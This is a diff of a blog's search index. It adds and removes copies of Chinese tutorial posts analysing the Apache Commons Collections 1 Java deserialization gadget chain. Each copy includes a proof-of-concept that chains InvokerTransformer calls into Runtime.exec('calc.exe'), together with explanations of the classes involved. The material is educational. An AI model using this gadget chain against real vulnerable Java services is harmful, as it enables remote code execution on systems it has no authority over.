@@ -1,6 +1,72 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Commons Collections1分析前置知识</title>
+    <url>/2022/03/23/Commons-Collections1%E5%88%86%E6%9E%90%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer"/>
+
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Commons Collections</code>的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。<code>Apache Commons Collections</code>是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。</p>
+<span id="more"></span>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JDK版本：jdk1.8以前（8u71之后已修复不可利用）</span><br><span class="line">CC版本：Commons-Collections 3.1-3.2.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>看下poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.sec.test1;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        //创建Map并绑定transformerChina</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        //给予map数据转化链</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        //触发漏洞</span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span><br><span class="line">        onlyElement.setValue(&quot;foobar&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>结果成功执行命令，先来说下原因：首先利用<code>ChainedTransformer</code>类构建一个<code>Transformer</code>链，通过调用多个Transformer类来造成命令执行；当调用<code>ChainedTransformer.transform()</code>时，会把<code>Transformer[]</code>数组中的所有<code>Transformer</code>依次执行<code>transform()</code>方法，而且这里每个<code>transform()</code>方法执行后的结果被传递给第二个<code>Transformer</code>去执行<code>transform()</code>方法，所以造成命令执行。以上代码相当于这一行代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().getClass().getMethod(&quot;exec&quot;,new </span><br><span class="line">Class[]&#123;String.class&#125;).invoke(Runtime.getRuntime(),&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323113633723-703888015.png" alt="image-20220323113632899"></p>
+<p>在调试调用链的时候，会接触到一些没接触过的类，先了解下这些类的作用。</p>
+<h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><p><code>Transformer</code>是<code>Commons Collections</code>中提供的一个接口</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323123755936-52589905.png" alt="image-20220323123754968"></p>
+<p>根据注释可以了解到，<code>Transformer</code> 定义由将一个对象转换为另一个对象的类实现的仿函数接口。 <code>Transformer</code> 将输入对象转换为输出对象，输入对象应保持不变。 <code>Transformer</code> 通常用于类型转换或从对象中提取数据。</p>
+<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p><code>ConstantTransformer</code>是<code>Transformer</code>的实现类，注释中解释说“每次返回相同常量的转换器实现，不检查对象是否不可变。通常，只有不可变对象才应该使用常量工厂，可变对象应该使用原型工厂”。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323143526760-1572607252.png" alt="image-20220323143526180"></p>
+<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p><code>InvokerTransformer</code>也是<code>Transformer</code>的实现类，作用是通过反射创建一个新对象实例的<code>Transformer</code>实现。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323143651333-1091631069.png" alt="image-20220323143650924"></p>
+<p>在构造方法中有三个参数，第一个参数是待执行的方法名，第二个参数<br>是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表 。</p>
+<p>里面还有个<code>transform</code>的方法，代码很明显，该方法可以通过Java反射机制来进行执行任意代码。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323145022998-2014512859.png" alt="image-20220323145022528"></p>
+<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><code>ChainedTransformer</code>也是实现了<code>Transformer</code>接口的⼀个类，作用是可以实现将指定的<code>Transformer</code>链接在一起。输入对象被传递给第一个<code>Transformer</code>，输出后的结果被传递给第二个<code>Transformer</code>，依此类推。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323150705722-1852287205.png" alt="image-20220323150705192"></p>
+<p>注意到<code>ChainedTransformer</code>有个<code>transform</code>方法，该方法的作用是将每个<code>Transformer</code>的输入转换为结果，这里会遍历<code>transform</code>数组。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323151522263-1798028772.png" alt="image-20220323151521930"></p>
+<h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h4><p>利用<code>Transformer</code>来执行命令需要绑定到Map上，抽象类<code>AbstractMapDecorator</code>是<code>Apache Commons Collections</code>提供的一个类，实现类有很多，比如<code>LazyMap</code>、<code>TransformedMap</code>等，这些类都有一个<code>decorate()</code>方法，用于将上述的<code>Transformer</code>实现类绑定到Map上，当对Map进行一些操作时，如修改数据，会自动触发<code>Transformer</code>实现类的<code>tranform()</code>方法，不同的Map类型有不同的触发规则。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323153425618-474630593.png" alt="image-20220323153425166"></p>
+<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>之前我们在poc里写了如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //给予map数据转化链</span><br></pre></td></tr></table></figure>
+
+<p>跟踪下就可以知道，通过<code>TransformedMap.decorate()</code>方法将<code>Transformer</code>实现类分别绑定到map的key和value上，当map的key或value被修改时，会调用对应<code>Transformer</code>实现类的<code>transform()</code>方法。我们可以把<code>chainedtransformer</code>绑定到一个<code>TransformedMap</code>上，当此map的key或value发生改变时，就会自动触发<code>chainedtransformer.transform()</code>方法。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323155612605-743381297.png" alt="image-20220323155612177"></p>
+<p>下面简单分析下执行流程</p>
+<p>先编写一个测试用例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.sec.test1;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Mytransform implements Transformer &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    public Mytransform(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        System.out.println(&quot;in myTransformer ：transform()&quot;);</span><br><span class="line">        System.out.println(&quot;input is &quot; + input);</span><br><span class="line">        return this.name;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Transformer getinstance(String name) &#123;</span><br><span class="line">        return new Mytransform(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Mytransform mytransform = (Mytransform) Mytransform.getinstance(&quot;sec&quot;);</span><br><span class="line">        HashMap objectObjectHashMap = new HashMap();</span><br><span class="line">        objectObjectHashMap.put(&quot;key1&quot;, &quot;value1&quot;);</span><br><span class="line">        objectObjectHashMap.put(&quot;key2&quot;, &quot;value2&quot;);</span><br><span class="line">        Map map = TransformedMap.decorate(objectObjectHashMap, null, mytransform);</span><br><span class="line">        Map.Entry entry = (Map.Entry) map.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;new1&quot;);</span><br><span class="line">        System.out.println(objectObjectHashMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170657843-464346168.png" alt="image-20220323170657299"></p>
+<p>在<code>setValue</code>处打上断点</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170721169-1610215049.png" alt="image-20220323170720926"></p>
+<p>点击调式</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170809103-262640445.png" alt="image-20220323170808590"></p>
+<p>进入<code>setValue</code>方法中，这里会将value值传递给<code>checkSetValue()</code>方法中</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170847433-789972894.png" alt="image-20220323170847068"></p>
+<p>跟进<code>checkSetValue()</code>方法，到这里已经和上面我们得出的结论一致了，它会调用对应<code>Transformer</code>实现类的<code>transform()</code>方法，这里的<code>valueTransformer</code>是在<code>TransformedMap.decorate</code>中将<code>mytransform</code>赋值给它的</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170943956-2034361576.png" alt="image-20220323170943534"></p>
+<p>跟进，就进入了我们重写的<code>transform</code>方法中</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323171354657-400333195.png" alt="image-20220323171354317"></p>
+<p>以上就是一些前置知识。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/litlife/p/12571787.html#transformedmap">https://www.cnblogs.com/litlife/p/12571787.html#transformedmap</a></p>
+<p><a href="https://www.cnblogs.com/nice0e3/p/13758664.html#transformer">https://www.cnblogs.com/nice0e3/p/13758664.html#transformer</a></p>
+]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>cc链</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>APP测试-DIVA</title>
     <url>/2022/03/22/APP%E6%B5%8B%E8%AF%95-DIVA/</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer"/>
@@ -146,72 +212,6 @@
       </categories>
       <tags>
         <tag>APP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Commons Collections1分析前置知识</title>
-    <url>/2022/03/23/Commons-Collections1%E5%88%86%E6%9E%90%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer"/>
-
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Commons Collections</code>的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。<code>Apache Commons Collections</code>是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。</p>
-<span id="more"></span>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JDK版本：jdk1.8以前（8u71之后已修复不可利用）</span><br><span class="line">CC版本：Commons-Collections 3.1-3.2.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>看下poc</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.sec.test1;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        //创建Map并绑定transformerChina</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        //给予map数据转化链</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        //触发漏洞</span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span><br><span class="line">        onlyElement.setValue(&quot;foobar&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>结果成功执行命令，先来说下原因：首先利用<code>ChainedTransformer</code>类构建一个<code>Transformer</code>链，通过调用多个Transformer类来造成命令执行；当调用<code>ChainedTransformer.transform()</code>时，会把<code>Transformer[]</code>数组中的所有<code>Transformer</code>依次执行<code>transform()</code>方法，而且这里每个<code>transform()</code>方法执行后的结果被传递给第二个<code>Transformer</code>去执行<code>transform()</code>方法，所以造成命令执行。以上代码相当于这一行代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().getClass().getMethod(&quot;exec&quot;,new </span><br><span class="line">Class[]&#123;String.class&#125;).invoke(Runtime.getRuntime(),&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323113633723-703888015.png" alt="image-20220323113632899"></p>
-<p>在调试调用链的时候，会接触到一些没接触过的类，先了解下这些类的作用。</p>
-<h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><p><code>Transformer</code>是<code>Commons Collections</code>中提供的一个接口</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323123755936-52589905.png" alt="image-20220323123754968"></p>
-<p>根据注释可以了解到，<code>Transformer</code> 定义由将一个对象转换为另一个对象的类实现的仿函数接口。 <code>Transformer</code> 将输入对象转换为输出对象，输入对象应保持不变。 <code>Transformer</code> 通常用于类型转换或从对象中提取数据。</p>
-<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p><code>ConstantTransformer</code>是<code>Transformer</code>的实现类，注释中解释说“每次返回相同常量的转换器实现，不检查对象是否不可变。通常，只有不可变对象才应该使用常量工厂，可变对象应该使用原型工厂”。</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323143526760-1572607252.png" alt="image-20220323143526180"></p>
-<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p><code>InvokerTransformer</code>也是<code>Transformer</code>的实现类，作用是通过反射创建一个新对象实例的<code>Transformer</code>实现。</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323143651333-1091631069.png" alt="image-20220323143650924"></p>
-<p>在构造方法中有三个参数，第一个参数是待执行的方法名，第二个参数<br>是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表 。</p>
-<p>里面还有个<code>transform</code>的方法，代码很明显，该方法可以通过Java反射机制来进行执行任意代码。</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323145022998-2014512859.png" alt="image-20220323145022528"></p>
-<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><code>ChainedTransformer</code>也是实现了<code>Transformer</code>接口的⼀个类，作用是可以实现将指定的<code>Transformer</code>链接在一起。输入对象被传递给第一个<code>Transformer</code>，输出后的结果被传递给第二个<code>Transformer</code>，依此类推。</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323150705722-1852287205.png" alt="image-20220323150705192"></p>
-<p>注意到<code>ChainedTransformer</code>有个<code>transform</code>方法，该方法的作用是将每个<code>Transformer</code>的输入转换为结果，这里会遍历<code>transform</code>数组。</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323151522263-1798028772.png" alt="image-20220323151521930"></p>
-<h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h4><p>利用<code>Transformer</code>来执行命令需要绑定到Map上，抽象类<code>AbstractMapDecorator</code>是<code>Apache Commons Collections</code>提供的一个类，实现类有很多，比如<code>LazyMap</code>、<code>TransformedMap</code>等，这些类都有一个<code>decorate()</code>方法，用于将上述的<code>Transformer</code>实现类绑定到Map上，当对Map进行一些操作时，如修改数据，会自动触发<code>Transformer</code>实现类的<code>tranform()</code>方法，不同的Map类型有不同的触发规则。</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323153425618-474630593.png" alt="image-20220323153425166"></p>
-<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>之前我们在poc里写了如下代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //给予map数据转化链</span><br></pre></td></tr></table></figure>
-
-<p>跟踪下就可以知道，通过<code>TransformedMap.decorate()</code>方法将<code>Transformer</code>实现类分别绑定到map的key和value上，当map的key或value被修改时，会调用对应<code>Transformer</code>实现类的<code>transform()</code>方法。我们可以把<code>chainedtransformer</code>绑定到一个<code>TransformedMap</code>上，当此map的key或value发生改变时，就会自动触发<code>chainedtransformer.transform()</code>方法。</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323155612605-743381297.png" alt="image-20220323155612177"></p>
-<p>下面简单分析下执行流程</p>
-<p>先编写一个测试用例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.sec.test1;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Mytransform implements Transformer &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    public Mytransform(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        System.out.println(&quot;in myTransformer ：transform()&quot;);</span><br><span class="line">        System.out.println(&quot;input is &quot; + input);</span><br><span class="line">        return this.name;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Transformer getinstance(String name) &#123;</span><br><span class="line">        return new Mytransform(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Mytransform mytransform = (Mytransform) Mytransform.getinstance(&quot;sec&quot;);</span><br><span class="line">        HashMap objectObjectHashMap = new HashMap();</span><br><span class="line">        objectObjectHashMap.put(&quot;key1&quot;, &quot;value1&quot;);</span><br><span class="line">        objectObjectHashMap.put(&quot;key2&quot;, &quot;value2&quot;);</span><br><span class="line">        Map map = TransformedMap.decorate(objectObjectHashMap, null, mytransform);</span><br><span class="line">        Map.Entry entry = (Map.Entry) map.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;new1&quot;);</span><br><span class="line">        System.out.println(objectObjectHashMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果如下</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170657843-464346168.png" alt="image-20220323170657299"></p>
-<p>在<code>setValue</code>处打上断点</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170721169-1610215049.png" alt="image-20220323170720926"></p>
-<p>点击调式</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170809103-262640445.png" alt="image-20220323170808590"></p>
-<p>进入<code>setValue</code>方法中，这里会将value值传递给<code>checkSetValue()</code>方法中</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170847433-789972894.png" alt="image-20220323170847068"></p>
-<p>跟进<code>checkSetValue()</code>方法，到这里已经和上面我们得出的结论一致了，它会调用对应<code>Transformer</code>实现类的<code>transform()</code>方法，这里的<code>valueTransformer</code>是在<code>TransformedMap.decorate</code>中将<code>mytransform</code>赋值给它的</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170943956-2034361576.png" alt="image-20220323170943534"></p>
-<p>跟进，就进入了我们重写的<code>transform</code>方法中</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323171354657-400333195.png" alt="image-20220323171354317"></p>
-<p>以上就是一些前置知识。</p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/litlife/p/12571787.html#transformedmap">https://www.cnblogs.com/litlife/p/12571787.html#transformedmap</a></p>
-<p><a href="https://www.cnblogs.com/nice0e3/p/13758664.html#transformer">https://www.cnblogs.com/nice0e3/p/13758664.html#transformer</a></p>
-]]></content>
-      <categories>
-        <category>Java安全</category>
-      </categories>
-      <tags>
-        <tag>cc链</tag>
       </tags>
   </entry>
   <entry>
@@ -573,131 +573,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Java安全之Commons Collections1分析（一）</title>
-    <url>/2022/03/31/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer"/>
-
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CC链的前置基础学习完后，就可以开始学习CC链的具体执行流程。</p>
-<span id="more"></span>
-
-<h3 id="CC链分析"><a href="#CC链分析" class="headerlink" title="CC链分析"></a>CC链分析</h3><p>先来看下poc代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        //创建Map并绑定transformer</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        //给予map数据转化链</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        //触发漏洞</span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span><br><span class="line">        onlyElement.setValue(&quot;test&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>下面逐一分析</p>
-<p>先看下面这段代码，<code>ConstantTransformer</code>和<code>InvokerTransformer</code>都是<code>Transformer</code>接口的实现类，通过new创建了一个 Transformer类型的数组，里面存储的是 Transformer的实现类对象。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
-
-<h3 id="ConstantTransformer分析"><a href="#ConstantTransformer分析" class="headerlink" title="ConstantTransformer分析"></a>ConstantTransformer分析</h3><p>先来分析一下<code>ConstantTransformer</code></p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331213802750-70517686.png" alt="image-20220331213801907"></p>
-<p>这里是使用了构造方法传入参数，poc中传入的参数为<code>Runtime.class</code>，而在调用到transform时，会返回我们传入的参数，也就是返回这里的<code>iConstant</code>。</p>
-<h3 id="InvokerTransformer分析"><a href="#InvokerTransformer分析" class="headerlink" title="InvokerTransformer分析"></a>InvokerTransformer分析</h3><p>打一个debug跟踪到<code>InvokerTransformer</code>类的构造方法里面</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331214255708-71059607.png" alt="image-20220331214256009"></p>
-<p>可以看到传入到构造方法中有三个参数，第一个是方法名，第二个是参数类型，第三个是参数的值。</p>
-<p>poc里的三个<code>InvokerTransformer</code>的参数值，如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getMethod,new Class[]&#123;String.class, Class[].class&#125;,new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;</span><br><span class="line">invoke,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;</span><br><span class="line">exec,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在<code>InvokerTransformer</code>类中同样存在<code>transform</code>方法，后面再具体分析</p>
